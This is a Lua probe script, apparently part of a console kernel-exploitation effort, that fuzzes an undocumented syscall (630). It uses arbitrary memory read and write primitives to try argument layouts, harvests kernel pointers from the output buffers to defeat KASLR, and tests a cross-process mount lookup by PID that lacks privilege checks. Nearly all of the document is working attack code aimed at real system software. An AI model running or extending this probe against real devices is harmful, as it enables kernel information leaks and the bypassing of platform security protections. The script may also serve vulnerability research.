-- CRASH_CLASS: LOW
-- PROBE 91a: sys 630 mount/filesystem enumeration — zero priv_check
--
-- Context: Deep analysis of sys 630 (12KB jail/mount companion, narg=1) reveals:
--   - Mount tree enumerator (0x0d0): lists ALL kernel mount points, NO priv_check
--   - Mount tree lookup (0x1f0): reads 0x420 bytes of any mount's data, NO priv_check
--   - Filesystem entry scanner (0x310): lists ALL directory entries, NO priv_check
--   - Cross-process mount lookup (0x450): takes arbitrary PID, NO relationship check
--   - Mount info query (0x7a0): returns page counts + flags, NO priv_check
--   - Ioctl handler (0x1630): 3 commands, up to 1MB user data, NO credential check
--   - Timer-based processing: stored config processed every 20s with kernel privilege
--
-- Mount data may contain kernel pointers from mount structures → KASLR defeat.
-- Cross-process mount lookup could reveal other process data.
-- Ioctl config injection could manipulate kernel mount processing.
--
-- narg=1: single argument. Entry at 0x000 does copyinstr+copyin from user pointer.
-- The ioctl codes 0xc0305201/0xc0305202/0xc0305203 suggest internal dispatch.
--
-- Section A: Basic reachability — various arg0 patterns
-- Section B: Pointer-based arg — user buffer with command structures
-- Section C: Mount enumeration harvest — if reachable, dump for kernel pointers
-- Section D: Cross-process mount lookup via PID

local TEST_SECTION = TEST_SECTION or "D"

print("=== PROBE 91a: sys 630 MOUNT ENUMERATION ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc630 = make_syscall(630)
local sc20 = make_syscall(20)  -- getpid

-- Get our PID for cross-process tests
local pid = 0
do
    local ok, rv = pcall(function() return sc20() end)
    if ok then pid = to_num(rv) end
end
print("Our PID: " .. pid)
print("")

if TEST_SECTION == "A" then
    print("--- Section A: Basic reachability test ---")
    print("")

    -- Test 1: Direct constant values as arg0
    print("[A1] arg0 = direct constants:")
    local test_vals = {0, 1, 2, 3, 0x7a0, 0xFFFFFFFF}
    for _, val in ipairs(test_vals) do
        local ok, rv = pcall(function()
            return sc630(uint64(val))
        end)
        if ok then
            print(string.format("  arg=0x%X: ret=%s", val, fmt(rv)))
        else
            print(string.format("  arg=0x%X: PCALL-FAIL", val))
        end
    end
    print("")

    -- Test 2: arg0 = pointer to zeroed buffer
    print("[A2] arg0 = pointer to allocated buffer (zeroed):")
    local buf = memory.alloc(0x1000)
    for i = 0, 255 do safe_wd(buf + i * 4, 0) end
    local ok, rv = pcall(function() return sc630(uint64(buf)) end)
    if ok then
        print("  zeroed buf: ret=" .. fmt(rv))
    else
        print("  zeroed buf: PCALL-FAIL")
    end
    print("")

    -- Test 3: arg0 = pointer to buffer with path string "/"
    print("[A3] arg0 = pointer with path '/':")
    memory.write_byte(buf, 0x2F)      -- '/'
    memory.write_byte(buf + 1, 0x00)  -- null terminator
    ok, rv = pcall(function() return sc630(uint64(buf)) end)
    if ok then
        print("  path '/': ret=" .. fmt(rv))
        -- Read output area for any data
        for off = 0, 0x80, 4 do
            local val = safe_rd(buf + off)
            if val and val ~= 0 and off > 1 then
                print(string.format("    +0x%X: 0x%X", off, val))
            end
        end
    else
        print("  path '/': PCALL-FAIL")
    end
    print("")

    -- Test 4: Common mount paths
    print("[A4] Various path strings:")
    local paths = {"/dev", "/dev/null", "/proc", "/tmp", "/sandbox", "/app0"}
    for _, path in ipairs(paths) do
        for i = 0, 63 do safe_wd(buf + i * 4, 0) end
        for ci = 1, #path do
            memory.write_byte(buf + ci - 1, string.byte(path, ci))
        end
        memory.write_byte(buf + #path, 0)
        ok, rv = pcall(function() return sc630(uint64(buf)) end)
        if ok then
            print(string.format("  '%s': ret=%s", path, fmt(rv)))
        else
            print(string.format("  '%s': PCALL-FAIL", path))
        end
    end
    print("")

    -- Test 5: Module init/destroy (arg=0 creates, arg=1 destroys)
    -- The analysis says 0x14c0: "arg=0 creates module, arg=1 tears down"
    print("[A5] Module init/destroy (analysis offset 0x14c0):")
    -- This might be a sub-operation code, not a path
    for subcmd = 0, 3 do
        for i = 0, 63 do safe_wd(buf + i * 4, 0) end
        safe_wd(buf, subcmd)
        ok, rv = pcall(function() return sc630(uint64(buf)) end)
        if ok then
            print(string.format("  buf[0]=%d: ret=%s", subcmd, fmt(rv)))
        else
            print(string.format("  buf[0]=%d: PCALL-FAIL", subcmd))
        end
    end

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: Command structure exploration ---")
    print("")

    -- The ioctl codes are 0xc0305201/0xc0305202/0xc0305203
    -- IOC encoding: _IOWR('R', 1/2/3, 48-byte struct)
    -- 0xc030: direction=IOWR, size=0x30 (48 bytes)
    -- 0x52: 'R' group
    -- 0x01/0x02/0x03: command number
    --
    -- Since this is a syscall not an ioctl, the user structure might
    -- contain the command code at a specific offset.

    local buf = memory.alloc(0x1000)
    local outbuf = memory.alloc(0x1000)

    -- Try: first 4 bytes = command code, rest = parameters
    print("[B1] Command code at buf+0 (0x01, 0x02, 0x03, plus others):")
    for cmd = 0, 10 do
        for i = 0, 255 do safe_wd(buf + i * 4, 0) end
        safe_wd(buf, cmd)
        safe_wd(buf + 4, 0x1000)  -- possible size/offset field
        local ok, rv = pcall(function() return sc630(uint64(buf)) end)
        if ok then
            print(string.format("  cmd=%d: ret=%s", cmd, fmt(rv)))
            -- Check for output data
            local word1 = safe_rd(buf + 0x30)
            local word2 = safe_rd(buf + 0x34)
            if (word1 and word1 ~= 0) or (word2 and word2 ~= 0) then
                print(string.format("    output: +0x30=0x%X +0x34=0x%X", word1 or 0, word2 or 0))
            end
        else
            print(string.format("  cmd=%d: PCALL-FAIL", cmd))
        end
    end
    print("")

    -- Try full ioctl codes as first field
    print("[B2] Full ioctl codes at buf+0:")
    local ioctl_cmds = {0xc0305201, 0xc0305202, 0xc0305203}
    for _, icmd in ipairs(ioctl_cmds) do
        for i = 0, 255 do safe_wd(buf + i * 4, 0) end
        safe_wd(buf, icmd)
        local ok, rv = pcall(function() return sc630(uint64(buf)) end)
        if ok then
            print(string.format("  ioctl=0x%X: ret=%s", icmd, fmt(rv)))
        else
            print(string.format("  ioctl=0x%X: PCALL-FAIL", icmd))
        end
    end
    print("")

    -- Try two-pointer layout: arg0 = {path_ptr, output_ptr, cmd, ...}
    print("[B3] Two-pointer structure layout:")
    local pathbuf = memory.alloc(0x400)
    memory.write_byte(pathbuf, 0x2F)     -- "/"
    memory.write_byte(pathbuf + 1, 0x00)

    for i = 0, 255 do safe_wd(buf + i * 4, 0) end
    -- Write path pointer at buf+0
    safe_wq(buf, pathbuf)
    -- Write output pointer at buf+8
    safe_wq(buf + 8, outbuf)
    -- Write size at buf+16
    safe_wd(buf + 16, 0x400)

    local ok, rv = pcall(function() return sc630(uint64(buf)) end)
    if ok then
        print("  two-ptr layout: ret=" .. fmt(rv))
        -- Scan output for data
        for off = 0, 0x100, 8 do
            local qval = safe_rq(outbuf + off)
            if qval then
                local h, l = get_hi_lo(qval)
                if h ~= 0 or l ~= 0 then
                    print(string.format("    out+0x%X: %s", off, fmt(qval)))
                    if h >= 0xFFFF8000 then
                        print("    *** KERNEL POINTER ***")
                    end
                end
            end
        end
    else
        print("  two-ptr layout: PCALL-FAIL")
    end
    print("")

    -- Try as mount type validator: bitmask 0x1ffbff on types 0-20
    print("[B4] Mount type validator test (types 0-20):")
    for mtype = 0, 20 do
        for i = 0, 63 do safe_wd(buf + i * 4, 0) end
        safe_wd(buf, mtype)
        safe_wd(buf + 4, 0)  -- flags
        ok, rv = pcall(function() return sc630(uint64(buf)) end)
        if ok then
            local rh, rl = get_hi_lo(rv)
            if rl ~= 0 or rh ~= 0 then
                print(string.format("  type=%d: ret=%s", mtype, fmt(rv)))
            end
        end
    end

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: Mount enumeration data harvest ---")
    print("")

    -- Try different approaches to trigger mount enumeration
    -- The enumerator at 0x0d0 locks tree at 0x3259ce0, walks extracting +0x28 values
    -- The scanner at 0x310 iterates from global list at 0x2c6d210

    local buf = memory.alloc(0x2000)

    -- Approach 1: Large output buffer, try to get mount list
    print("[C1] Large buffer approach — arg0 points to output area:")
    for i = 0, 511 do safe_wd(buf + i * 4, 0) end
    -- Try with flags that might request enumeration
    safe_wd(buf, 0xFF)   -- possible "list all" flag
    safe_wd(buf + 4, 0)
    safe_wd(buf + 8, 0x1000) -- buffer size
    local ok, rv = pcall(function() return sc630(uint64(buf)) end)
    if ok then
        print("  ret=" .. fmt(rv))
        -- Scan entire buffer for non-zero qwords
        local found_data = false
        for off = 0, 0x1000, 8 do
            local qval = safe_rq(buf + off)
            if qval then
                local h, l = get_hi_lo(qval)
                if h ~= 0 or l ~= 0 then
                    found_data = true
                    if h >= 0xFFFF8000 then
                        print(string.format("  +0x%X: %s *** KERNEL PTR ***", off, fmt(qval)))
                    elseif off < 0x100 then
                        print(string.format("  +0x%X: %s", off, fmt(qval)))
                    end
                end
            end
        end
        if not found_data then
            print("  Buffer is all zeros")
        end
    else
        print("  PCALL-FAIL")
    end
    print("")

    -- Approach 2: Structure with embedded path + output area
    print("[C2] Copyinstr approach — path string at buf start:")
    for i = 0, 511 do safe_wd(buf + i * 4, 0) end
    -- Write "/" as first string (copyinstr reads this)
    memory.write_byte(buf, 0x2F)
    memory.write_byte(buf + 1, 0x00)
    -- After the string, write potential parameters
    safe_wd(buf + 0x400, 0x01)    -- possible sub-command
    safe_wd(buf + 0x404, 0x1000)  -- possible buffer size

    ok, rv = pcall(function() return sc630(uint64(buf)) end)
    if ok then
        print("  path+params: ret=" .. fmt(rv))
        -- The handler allocates 0x400 for copyinstr then does copyin
        -- Check if copyin wrote data to our buffer at offset 0x400+
        for off = 0x400, 0x800, 8 do
            local qval = safe_rq(buf + off)
            if qval then
                local h, l = get_hi_lo(qval)
                if h >= 0xFFFF8000 then
                    print(string.format("  +0x%X: %s *** KERNEL PTR ***", off, fmt(qval)))
                end
            end
        end
    else
        print("  path+params: PCALL-FAIL")
    end
    print("")

    -- Approach 3: Different return values are informative
    -- ret=0 success, ret=3 not found, ret=22 EINVAL, etc.
    print("[C3] Return value survey with path variations:")
    local test_paths = {
        "", ".", "..", "/dev", "/dev/dmem0", "/dev/console",
        "/proc/self", "/sandbox/savedata", "/app0", "/data",
        "/system", "/user", "/mnt", "/hostfs", "/download0"
    }
    for _, path in ipairs(test_paths) do
        for i = 0, 255 do safe_wd(buf + i * 4, 0) end
        for ci = 1, #path do
            memory.write_byte(buf + ci - 1, string.byte(path, ci))
        end
        memory.write_byte(buf + #path, 0)
        ok, rv = pcall(function() return sc630(uint64(buf)) end)
        if ok then
            print(string.format("  '%s': ret=%s", path, fmt(rv)))
        else
            print(string.format("  '%s': PCALL-FAIL", path))
        end
    end

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: Cross-process mount lookup + info query ---")
    print("")

    -- Cross-process mount lookup at 0x450:
    -- Takes PID, calls pfind(), scans mounts, copies 0x20 bytes name + serial
    -- NO check that caller has relationship to target
    --
    -- How to invoke: the PID might be a field in the user structure

    local buf = memory.alloc(0x1000)

    -- Try PID as direct arg to sys 630 (unlikely but test)
    print("[D1] Direct PID as arg0:")
    local ok, rv = pcall(function() return sc630(uint64(pid)) end)
    if ok then
        print("  our PID=" .. pid .. ": ret=" .. fmt(rv))
    else
        print("  our PID: PCALL-FAIL")
    end
    print("")

    -- Try PID in various structure positions
    print("[D2] PID in structure at various offsets:")
    local offsets = {0, 4, 8, 12, 16, 0x20, 0x30}
    for _, pidoff in ipairs(offsets) do
        for i = 0, 127 do safe_wd(buf + i * 4, 0) end
        safe_wd(buf + pidoff, pid)
        ok, rv = pcall(function() return sc630(uint64(buf)) end)
        if ok then
            print(string.format("  PID at +0x%X: ret=%s", pidoff, fmt(rv)))
            -- Check if any output was written
            for off = 0, 0x80, 8 do
                local qval = safe_rq(buf + off)
                if qval and off ~= pidoff then
                    local h, l = get_hi_lo(qval)
                    if h ~= 0 or (l ~= 0 and l ~= pid) then
                        print(string.format("    out+0x%X: %s", off, fmt(qval)))
                    end
                end
            end
        end
    end
    print("")

    -- Mount info query at 0x7a0 returns page_count * 0x4000, raw count, flags
    -- This might need a mount handle/ID in the structure
    print("[D3] Mount info query attempt (handle values 0-20):")
    for handle = 0, 20 do
        for i = 0, 63 do safe_wd(buf + i * 4, 0) end
        -- Try: byte 0 = operation code, dword +4 = handle
        memory.write_byte(buf, 0x03)  -- possible "query" opcode
        safe_wd(buf + 4, handle)
        safe_wd(buf + 8, 0x400)  -- output size
        ok, rv = pcall(function() return sc630(uint64(buf)) end)
        if ok then
            local rh, rl = get_hi_lo(rv)
            if rl ~= 0 or rh ~= 0 then
                print(string.format("  handle=%d: ret=%s", handle, fmt(rv)))
            end
        end
    end
    print("")

    -- Try the 128-entry mount ID table scan
    -- Analysis mentions 128-entry table at 0x325b390
    print("[D4] Mount ID lookup test (IDs 0-15):")
    for mid = 0, 15 do
        for i = 0, 63 do safe_wd(buf + i * 4, 0) end
        safe_wd(buf, mid)
        safe_wd(buf + 4, 1)  -- possible query flag
        ok, rv = pcall(function() return sc630(uint64(buf)) end)
        if ok then
            print(string.format("  mount_id=%d: ret=%s", mid, fmt(rv)))
        end
    end

    print("")
    print("[DONE] Section D complete")
end

print("")
print("=== PROBE 91a COMPLETE ===")

